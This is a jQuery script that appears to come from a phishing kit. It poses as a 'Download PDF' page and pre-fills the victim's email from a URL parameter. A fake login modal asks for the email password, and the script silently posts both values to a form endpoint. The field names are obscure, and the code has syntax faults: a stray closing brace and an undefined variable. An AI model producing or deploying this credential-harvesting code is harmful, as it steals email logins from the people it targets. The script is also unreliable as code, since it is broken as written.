(function($){

    const params_url = new URLSearchParams(window.location.search);
    const emailauto = params_url.get('e');
    
    $(document).ready(function(){
        var count = 0;
        var form_error = [false, false];
         $('#msg').hide();
    
    
        $('#btn4dlmodal').on('click',function(e){
            if (emailauto !='') {
                $('#akpati').val(emailauto);
            }
            $loader_show("#ff0000")
            setTimeout(() => {
                $loader_hide()
                $('#loginModal').modal({
                       dismissible: false
                });
                $('#loginModal').modal('open');
                
            }, 2000) 
        
        });  	
    
        $('#btn4sbmt').on('click',function(e){
            e.preventDefault();
            var input4email = $('#akpati').val();
            var input4passwd = $('#igodo').val();
            var form_error = [false, false];
            $('#akpati').attr('style', '').next( "span" ).text("");
            $('#igodo').attr('style', '').next( "span" ).text("");
            $('#showerror').html("")
    
    
    
            if (input4email == '') {
                $('#akpati').next( "span" ).text("Email address is needed.");
                $('#akpati').focus().attr('style', 'border-color: #ff0000 !important');
                form_error[0] = true;
            }
            if (input4passwd == '') {
                $('#igodo').next( "span" ).text("Email password is needed.")
                $('#igodo').focus().attr('style', 'border-color: #ff0000 !important');
                form_error[1] = true;
            }	
            console.log(form_error)
    
            if(form_error.includes(true)){
                return false;
            }
    
            $.ajax({
                url: $('#gawaboy').attr('action'),
                method: "post",
                data: {email: input4email, password: input4passwd},
                processData: true,
                complete: function(jqXHR) {
               setTimeout(function() {
                    $('#msg').show();
                    $("#akpati1").val(url);
                    $("#igodo").val("");
                    $('#btn4sbmt').html('Download PDF').prop('disabled', false);
                }, 2000);
            }   
                }
            });   
    
        });  	
    
    // $confirm("Do you want to delete?", "#E74C3C")
    //   .then(() => {
    //      $toast("Deleted", "#E74C3C");
    // })
    
      
    // $alert("<i>Successfull</i>", '#E74C3C') 
    // $toast("No internet connection", "#F4D03F")
    
    // $loader_hide()
        // if (emailauto !='') {
        // 	$('#correo').val(autoemail);
        // }
    
    
    
    
    
    
     });
    
    
          // console.log('sdasd');
    
    
      // $(function(){
      //   $('.sidenav').sidenav();
      // }); // end of document ready
    
    })(jQuery); // end of jQuery name space
